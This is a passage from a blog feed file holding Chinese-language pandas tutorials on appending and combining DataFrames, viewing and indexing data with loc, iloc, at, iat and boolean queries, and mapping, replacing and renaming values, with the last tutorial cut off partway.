class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.append(left2)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-append.png" alt="append"></p><h2 id="2、不同结构数据追加"><a href="#2、不同结构数据追加" class="headerlink" title="2、不同结构数据追加"></a>2、不同结构数据追加</h2><p>不同结构数据追加，原数据没有的列会增加，没有对应内容的会为空NaN。<br>如：left3的数据集列有”编号”、”姓名”、”工资”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left3=pd.DataFrame([[<span class="number">8</span>,<span class="string">'孙八'</span>,<span class="number">10000</span>],[<span class="number">9</span>,<span class="string">'何九'</span>,<span class="number">15000</span>]],columns=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>,<span class="string">'工资'</span>])</span><br><span class="line">left3</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/%E4%B8%8D%E5%90%8C%E7%BB%93%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%BD%E5%8A%A0.png" alt="left3的数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.append(left3)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/%E4%B8%8D%E5%90%8C%E7%BB%93%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%BD%E5%8A%A02.png" alt="不同结构数据追加"></p><p>当left后追加left3后的数据集会增加“工资列”，没有对应内容的会为空。</p><h2 id="3、追加合并多个数据集"><a href="#3、追加合并多个数据集" class="headerlink" title="3、追加合并多个数据集"></a>3、追加合并多个数据集</h2><p>append参数可带数据集列表，可以将多个数据集追加到原数据集<br>如我们将left2和left3都追加到left</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.append([left2,left3])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/%E8%BF%BD%E5%8A%A0%E5%A4%9A%E4%B8%AA%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="追加合并多个数据集"></p><h1 id="五、combine-first"><a href="#五、combine-first" class="headerlink" title="五、combine_first"></a>五、combine_first</h1><p>combine_first可用于合并重复数据，用其他数据集填充没有的数据。如一个DataFrame数据集中出现了缺失数据，就可以用其他DataFrame数据集中的数据进行填充。语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">combine_first(other) <span class="comment">#只有一个参数other，该参数用于接收填充缺失值的DataFrame对象。</span></span><br></pre></td></tr></table></figure><p>如left数据集中没有”工资”的数据，我们可以用right数据集有的数据去填充left数据集中的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.combine_first(right) <span class="comment">#用right去填充left</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/combine_first.png" alt="combine_first"></p><h1 id="六、update"><a href="#六、update" class="headerlink" title="六、update"></a>六、update</h1><p>update和combine_first比较类似，区别在于：<br>1、填充合并方式稍有差异<br>combine_first：如果s1中c的值为空，用s2的值替换，否则保留s1的值<br>update：如果s2中的值不为空，那么替换s1，否则保留s1的值<br>2、update是更新原数据，combine_first会返回一个填充后的新数据集，对原数据不做更新。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.update(right) <span class="comment">#用right的数据更新left中的数据。</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/update.png" alt="update"></p><p>至此，本文介绍了pandas的多种数据合并与拼接方法，并介绍了每种方法的异同，通过pandas的数据处理可以应付日常数据处理中大部分的数据处理工作。</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas基本操作之数据访问(查看与检索)</title>
      <link href="/posts/808d8fe8/"/>
      <url>/posts/808d8fe8/</url>
      
        <content type="html"><![CDATA[<p>对于数据分析来说，在构造或载入数据后最基本的操作应该就是对数据的访问了。看一看数据的结构、组成、分布等，根据需要从数据集中检索提取出相应的数据。pandas作为数据分析的利器，当然提供了多种查看和检索数据的方法。本文就来捋一捋pandas基本的数据访问。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE.png" alt="数据访问"></p><h1 id="一、查看数据"><a href="#一、查看数据" class="headerlink" title="一、查看数据"></a>一、查看数据</h1><p>当我们拿到数据集后，第一步可能就是查看数据了，一方面是了解拿到的数据集的数据结构，另一方面随机检查一下数据的质量问题。<br>不管是Series还是DataFrame的数据集pandas常用的数据查看方法有：</p><table><thead><tr><th>方法</th><th>操作</th><th>结果</th></tr></thead><tbody><tr><td>head(n)</td><td>查看数据集对象的前n行</td><td>Series或DataFrame</td></tr><tr><td>tail(n)</td><td>查看数据集的最后n行</td><td>Series或DataFrame</td></tr><tr><td>sample(n)</td><td>随机查看n个样本</td><td>Series或DataFrame</td></tr><tr><td>describe()</td><td>数据集的统计摘要</td><td>Series</td></tr></tbody></table><p>以下就以一个DataFrame数据集为例来看看这些查看数据的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\staff.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/student%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="studend数据集"></p><h2 id="1、查看头部-head-n"><a href="#1、查看头部-head-n" class="headerlink" title="1、查看头部 head(n)"></a>1、查看头部 head(n)</h2><p>head()方法如果不带参数，默认返回前5条记录，带了参数n就返回前n条记录。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.head() <span class="comment">#默认查看前5条记录</span></span><br><span class="line">df.head(<span class="number">8</span>) <span class="comment">#指定查看前8条记录</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/head.png" alt="查看头部 head(n)"></p><h2 id="2、查看尾部-tail-n"><a href="#2、查看尾部-tail-n" class="headerlink" title="2、查看尾部 tail(n)"></a>2、查看尾部 tail(n)</h2><p>同样tail()方法如果不带参数，默认返回后面5条记录，带了参数n就返回后面n条记录。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.tail() <span class="comment">#默认查看后面5条记录</span></span><br><span class="line">df.tail(<span class="number">4</span>) <span class="comment">#指定查看后面4条记录</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/tail.png" alt="查看尾部 tail(n)"></p><h2 id="3、随机查看样本-sample-n"><a href="#3、随机查看样本-sample-n" class="headerlink" title="3、随机查看样本 sample(n)"></a>3、随机查看样本 sample(n)</h2><p>sample() 不带参数会随机返回一条样本数据，带了参数n就会随机返回n条记录。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.sample() <span class="comment">#随机查看一条记录</span></span><br><span class="line">df.sample(<span class="number">4</span>) <span class="comment">#随机查看4条记录</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/sample.png" alt="随机查看样本 sample(n)"></p><h2 id="4、查看统计摘要"><a href="#4、查看统计摘要" class="headerlink" title="4、查看统计摘要"></a>4、查看统计摘要</h2><p><code>df.describe()</code> 返回所有数字列的统计摘要。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/describe1.png" alt="查看统计摘要"></p><p>这里连staff_id的统计摘要就显示出来了，因为它是数字列。如果只看某一列的统计摘要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[[<span class="string">'staff_salary'</span>]].describe()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/describe2.png" alt="只看某一列的统计摘要"></p><h1 id="二、检索数据"><a href="#二、检索数据" class="headerlink" title="二、检索数据"></a>二、检索数据</h1><p>在数据分析过程中，很多时候需要从数据表中提取出相应的数据，而这么做的前提是需要先“检索”出这一部分数据。虽然通过 Python 提供的索引操作符”[]”和属性操作符”.”可以访问 Series 或者 DataFrame 中的数据，但这种方式只适应与少量的数据，为了解决这一问题，pandas 提供了多种类型的索引方式来实现数据的访问。包括[]、loc\iloc、at\iat、布尔索引<br>一般的:<br>df[‘name’] #会返回本列的Series<br>df.name   #也会返回本列的Series</p><blockquote><p>但是要注意，name应该是一个合法的python变量时才可以直接作为属性来使用。</p></blockquote><p>如：<br><strong>df[‘1级别’]可以正常返回索引列为“1级别”的数据，而df.1级别会报错，因为”1级别”不是一个合法的python变量。</strong><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E5%88%97%E7%B4%A2%E5%BC%95%E6%A3%80%E7%B4%A2.png" alt="列索引检索"><br>以下通过DataFrame数据集来说明常用检索数据的方法。对于DataFrame的数据集来说要检索数据通常是确定数据所在的行和列。而确定行和列也有两种方式，一是通过<strong>标签索引</strong>来确定，二是通过数据<strong>所在的位置</strong>来确定。<br>一般的：</p><table><thead><tr><th>操作</th><th>语法</th><th>返回结果</th></tr></thead><tbody><tr><td>选择列</td><td>df[col]</td><td>Series</td></tr><tr><td>按索引选择行</td><td>df.loc[label]</td><td>Series</td></tr><tr><td>按位置选择行</td><td>df.iloc[loc]</td><td>Series</td></tr><tr><td>使用切片选择行</td><td>df[2:5]</td><td>DataFrame</td></tr><tr><td>用表达式筛选行</td><td>df[bool]</td><td>DataFrame</td></tr></tbody></table><h2 id="1、切片"><a href="#1、切片" class="headerlink" title="1、切片[]"></a>1、切片[]</h2><p>通过[]进行检索，这将会对行进行切片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="number">0</span>:<span class="number">3</span>] <span class="comment">#通过切片检索行数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E5%88%87%E7%89%87.png" alt="在这里插入图片描述"></p><p>切片并不对列有效，如果是<code>df[0:3][1:2]</code>，会检索出0-3行，再在这三行切片的基础上切片中检索出第二行。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E5%88%87%E7%89%872.png" alt="df[0:3][1:2]"></p><p>如果要在切片检索的结果上再选择列，则可以通过列标签索引列表来选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="number">0</span>:<span class="number">3</span>][[<span class="string">'staff_id'</span>,<span class="string">'staff_name'</span>,<span class="string">'staff_gender'</span>]] <span class="comment">#通过列标签索引列表检索列数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E5%88%87%E7%89%873.png" alt="通过列标签索引列表来选择"></p><h2 id="2、loc-iloc"><a href="#2、loc-iloc" class="headerlink" title="2、loc\iloc"></a>2、loc\iloc</h2><h3 id="loc"><a href="#loc" class="headerlink" title="loc"></a>loc</h3><p>df.loc[] 只能使用标签索引，不能使用位置索引。当通过标签索引的切片方式来筛选数据时，它的取值前闭后闭，也就是只包括边界值标签（开始和结束）<br>.loc[] 具有多种访问方法，如下所示：</p><ul><li>一个标量标签 </li><li>标签列表 </li><li>切片对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df.loc[<span class="number">1</span>] <span class="comment">#标量标签，返回该行标签的Series数据</span></span><br><span class="line">df.loc[[<span class="number">1</span>,<span class="number">3</span>]] <span class="comment">#标签列表，返回标签列表的行DataFrame数据</span></span><br><span class="line">df.loc[<span class="number">0</span>:<span class="number">3</span>] <span class="comment">#切片对象，返回切片的行DataFrame数据</span></span><br><span class="line">df.loc[<span class="number">0</span>:<span class="number">3</span>,<span class="string">'staff_id'</span>:<span class="string">'staff_salary'</span>]  <span class="comment">#根据行切片，列切片检索数据</span></span><br><span class="line">df.loc[[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">'staff_id'</span>,<span class="string">'staff_name'</span>,<span class="string">'staff_age'</span>]] <span class="comment">#根据行标签列表，列标签列表检索数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/loc.png" alt="loc"></p><p>.loc[] 除了标量标签，标签列表和切片对象都接受两个参数，并以’,’分隔。第一个位置表示行检索，第二个位置表示列检索<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/loc2.png" alt="loc2"></p><h3 id="iloc"><a href="#iloc" class="headerlink" title="iloc"></a>iloc</h3><p>df.iloc[] 只能使用位置索引(用整数表示所在行或列的位置如第几行第几列)，不能使用标签索引，通过整数索引切片选择数据时，前闭后开(不包含边界结束值)。同 Python 和 NumPy 一样，它们的<strong>索引都是从 0 开始</strong><br>.iloc[] 提供了以下方式来选择数据：</p><ul><li>整数索引   </li><li>整数列表  </li><li>数值范围</li></ul><p>为了说明方便，我们把数据集的行索引重名为字母</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df=df.rename(index=&#123;<span class="number">0</span>:<span class="string">'A'</span>,<span class="number">1</span>:<span class="string">'B'</span>,<span class="number">2</span>:<span class="string">'C'</span>,<span class="number">3</span>:<span class="string">'D'</span>,<span class="number">4</span>:<span class="string">'E'</span>,<span class="number">5</span>:<span class="string">'F'</span>,<span class="number">6</span>:<span class="string">'G'</span>,<span class="number">7</span>:<span class="string">'H'</span>,<span class="number">8</span>:<span class="string">'I'</span>,<span class="number">9</span>:<span class="string">'J'</span>&#125;)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/rename.png" alt="reanme"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df.iloc[<span class="number">1</span>]  <span class="comment">#整数标量选择，数据从0开始，为1的就是第二行的数据，返回的是Series</span></span><br><span class="line">df.iloc[[<span class="number">1</span>,<span class="number">3</span>]] <span class="comment">#整数列表选择，选择位置为1和3的数据，返回的是DataFrame</span></span><br><span class="line">df.iloc[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#切片选择，选择位置1至2的数据，不包含边界结束值，也就是不包含3的位置</span></span><br><span class="line">df.iloc[<span class="number">1</span>:<span class="number">3</span>,<span class="number">1</span>:<span class="number">4</span>] <span class="comment">#切片选择位置为1至3的行和1至4的列不含位置为3的行和位置为4的列</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/iloc.png" alt="iloc"></p><h2 id="3、at-iat"><a href="#3、at-iat" class="headerlink" title="3、at\iat"></a>3、at\iat</h2><p>at和iat和loc和iloc类似，不同的是at和iat仅取一个具体的值，结构为 at[&lt;索引&gt;,&lt;列名&gt;]，iat[&lt;行位置&gt;,&lt;列位置&gt;]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.at[<span class="string">'A'</span>,<span class="string">'staff_name'</span>]  <span class="comment">#检索第“A”行的列标签为"staff_name"的数据</span></span><br><span class="line">df.iat[<span class="number">0</span>,<span class="number">1</span>]  <span class="comment">#检索第1行第2列的数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/at.png" alt="at\iat"></p><h2 id="4、布尔条件检索"><a href="#4、布尔条件检索" class="headerlink" title="4、布尔条件检索"></a>4、布尔条件检索</h2><h3 id="1、-里用布尔条件进行检索"><a href="#1、-里用布尔条件进行检索" class="headerlink" title="1、[] 里用布尔条件进行检索"></a>1、[] 里用布尔条件进行检索</h3><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[(df.staff_salary&gt;<span class="number">10000</span>)&amp;(df.staff_age&lt;<span class="number">40</span>)]  <span class="comment">#检索staff_age小于40且staff_salary&gt;10000的数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%5B%5D%E6%9D%A1%E4%BB%B6.png" alt="[] 里用布尔条件进行检索"></p><h3 id="2、loc索引部分用布尔条件检索"><a href="#2、loc索引部分用布尔条件检索" class="headerlink" title="2、loc索引部分用布尔条件检索"></a>2、loc索引部分用布尔条件检索</h3><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.loc[(df.staff_salary&gt;<span class="number">10000</span>)&amp;(df.staff_age&lt;<span class="number">40</span>)]  <span class="comment">#检索staff_age小于40且staff_salary&gt;10000的数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/loc%E6%9D%A1%E4%BB%B6.png" alt="loc索引部分用布尔条件检索"></p><h3 id="3、query函数布尔条件检索"><a href="#3、query函数布尔条件检索" class="headerlink" title="3、query函数布尔条件检索"></a>3、query函数布尔条件检索</h3><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.query(<span class="string">'staff_salary&gt;10000 &amp; staff_age&lt;40'</span>) <span class="comment">#通过函数检索staff_age小于40且staff_salary&gt;10000的数据</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220207/%E5%87%BD%E6%95%B0.png" alt="query函数布尔条件检索"></p><p>至此，本文介绍了pandas常用的数据访问操作通过head()、tail()、sample()、describe()查看数据，通过[]、loc\iloc、at\iat、及布尔条件检索数据。通过灵活运用pandas的各种数据访问方法可以很方便的根据需要查看和检索数据。</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据处理之数据转换(映射map、替换replace、重命名rename)</title>
      <link href="/posts/2c80aac2/"/>
      <url>/posts/2c80aac2/</url>
      
        <content type="html"><![CDATA[<p>我们在数据处理的过程中经常碰到需要对数据进行转换的工作，比如将原来数据里的字典值根据字典转义成有意义的说明，将某些数据转换成其他的数据，将空值转换成其他值，将数据字段名进行重命名等。pandas作为数据处理分析的利器当然为上述的这些数据转换提供了便捷的方法。我们可以利用pandas提供的映射、替换、重命名等操作方便的进行相应的数据转换操作。</p><p>本文通过实例重点介绍pandas常用的数据转换工具映射map()、替换replace()、重命名rename()</p><p><strong>映射</strong>：map()函数 对数据集Serice中的元素根据映射关系进行映射（作用于Serice或DataFrame对象的一列）<br><strong>替换</strong>：replace()函数 替换元素 (作用于DataFrame)<br><strong>重命名</strong>：rename()函数  替换索引 (作用于index或columns)</p><h1 id="一、映射-map"><a href="#一、映射-map" class="headerlink" title="一、映射 map()"></a>一、映射 map()</h1><p>在平时数据处理的过程中常常会碰到，某个字段（数据列）是数字表示的要根据映射表转换成有意思的字符。如性别在数据集里存的是1和2分别表示“男”和“女”，如何将数据集中“性别”列的1和2替换成“男”和“女”如何做？绝对不能用for循环一个个去替换。pandas也好、Numpy也好，都是针对数据集处理的，我们应该抛弃以前针对单个数据处理的思维去拥抱针对数据集来编程。使用pandas的map()方法，最少仅需一行代码就可以解决。<br>map() 函数是做用于 Series 或 DataFrame 对象的一列，它接收一个函数或表示映射关系的字典做为参数，它的基本语法格式以下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Series.map(arg,na_action=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>函数中的参数说明以下：</p><ul><li>arg：接收 function、dict 或 Series，表示映射关系；</li><li>na_action：类似R中的na.action，取值为None或ingore，用于控制遇到缺失值的处理方式，设置为ingore时串行运算过程中将忽略Nan值原样返回。</li></ul><p>下面通过实例来说明pandas的map()的使用，演示的student数据集如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\student.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/student%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="student数据集"></p><h2 id="1、通过数据字典映射"><a href="#1、通过数据字典映射" class="headerlink" title="1、通过数据字典映射"></a>1、通过数据字典映射</h2><p>map()方法接受数据字典参数，通过数据字典将数据进行映射。如我们需要将“性别”列的1和2替换成“男”和“女”，定义一个数据字典{1:’男’,2:’女’}，将1映射成“男”，将2映射成“女”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gender_map=&#123;<span class="number">1</span>:<span class="string">'男'</span>,<span class="number">2</span>:<span class="string">'女'</span>&#125;</span><br><span class="line">df[<span class="string">'性别'</span>]=df[<span class="string">'性别'</span>].map(gender_map)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/map%E5%AD%97%E5%85%B8%E6%98%A0%E5%B0%84.png" alt="数据字典映射"><br>可以看到通过map()将需要转换的列的值进行的转换，具体的转换过程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/map%E8%BF%87%E7%A8%8B.png" alt="map转换过程"></p><h2 id="2、lambda函数映射"><a href="#2、lambda函数映射" class="headerlink" title="2、lambda函数映射"></a>2、lambda函数映射</h2><p>map()方法还接受lambda函数的方式进行值的映射，如我们现在要把数学分数为95分以上的映射数学等级为“优秀”，95及以下的映射为“良好”。可以通过lambda函数进行映射。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'数学等级'</span>]=df[<span class="string">'5-数学'</span>].map(<span class="keyword">lambda</span> x:<span class="string">'优秀'</span> <span class="keyword">if</span> x&gt;<span class="number">95</span> <span class="keyword">else</span> <span class="string">'良好'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/lambda%E6%98%A0%E5%B0%84.png" alt="lambda函数映射"></p><h2 id="3、通用函数映射"><a href="#3、通用函数映射" class="headerlink" title="3、通用函数映射"></a>3、通用函数映射</h2><p>map()方法可以接收自定义通用的函数进行值的映射，如我们现在要把语文分数为95以上的映射为语文等级为“优秀”，95及以下的映射为“良好”，也可以通过自定义函数来实现映射。<br>先定义一个函数score(x)用于接收需要映射的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(x)</span>:</span></span><br><span class="line">    score_class=<span class="string">'良好'</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;<span class="number">95</span>:</span><br><span class="line">        score_class=<span class="string">'优秀'</span></span><br><span class="line">    <span class="keyword">return</span> score_class</span><br><span class="line">    </span><br><span class="line">df[<span class="string">'语文等级'</span>]=df[<span class="string">'4-语文'</span>].map(score)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/%E5%87%BD%E6%95%B0%E6%98%A0%E5%B0%84.png" alt="函数映射"></p><h1 id="二、替换-replace"><a href="#二、替换-replace" class="headerlink" title="二、替换 replace()"></a>二、替换 replace()</h1><p>如果要对全DataFrame数据集中的数据进行某种替换，map()可能需要对数据集中的每个列都进行map()操作才可以，但是通过pandas的替换方法replace可以一次性替换掉DataFrame中所有的数据。如：我们现在要将数据集中所有的“良好”替换成“良”，所有的“优秀”替换成“优”<br>可以直接通过 <code>df.replace([&#39;优秀&#39;,&#39;良好&#39;],[&#39;优&#39;,&#39;良&#39;])</code> 一句代码搞定。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/replace%E8%BF%87%E7%A8%8B.png" alt="替换"></p><p>以前文章中介绍了处理缺失值用fillna的方式来填充缺失值，用replace则提供了一种更加简单、灵活的处理缺失值或异常值的方式。<br>如在数据集中有一个数据列“是否接种”，这里的值有“已”、“是”、“否”、NaN，实际是在收集统计表格的时候大家填的数据不一致，不标准。现在需要将“已”的全部改成“是”，NaN没有填的改成“否”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.replace([<span class="string">'已'</span>,np.nan],[<span class="string">'是'</span>,<span class="string">'否'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/replace%E7%A9%BA%E5%80%BC.png" alt="填充缺失值"></p><h1 id="三、重命名-rename"><a href="#三、重命名-rename" class="headerlink" title="三、重命名 rename()"></a>三、重命名 rename()</h1><p>在数据处理的过程有时候需要对列索引进行重命名，一个典型的例子就是对于数据的检索或其他操作df[column]对于任意列名均有效，但是df.column只在列名是有效的Python变量名时才有效。<br>我们在检索英语大于95分的数据时可以用<code>df[df[&#39;6-英语&#39;]&gt;95]</code><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/%E9%87%8D%E5%91%BD%E5%90%8D1.png" alt="英语大于95分的数据"></p><p> 但是用<code>df.query(&#39;6-英语 &gt;95&#39;)</code> 就会报列名没有定义的错，因为’6-英语’列名不是有效的Python变量名。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/query%E6%8A%A5%E9%94%99.png" alt="报列名没有定义的错"></p><p>这时候就需要将列名重命名为有效的Python变量名，有效的Python变量名应该是只能_，数字，字母组成，不可以是空格或者特殊字符(!@#$%^&amp;*~)，不能是数字开头，不能有中文。我们将“6-英语”的列名重命名为“english”。注意带上inplace=True参数用于更新作用于本数据集，而不是返回一个新的数据集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.rename(columns=&#123;<span class="string">'6-英语'</span>:<span class="string">'english'</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line">df.query(<span class="string">'english &gt; 95'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/%E9%87%8D%E5%91%BD%E5%90%8D1%E5%88%97.png" alt="重命名"><br>可以看到“6-英语”列名改成了“english”，并且df.query(‘english &gt; 95’)不报错，可以正常检索出数据了。<br>更多的，如果要重命名多个列，可以传入一个需要重命名的多个字典值，进行多个列的重命名。</p><figure class="highlight 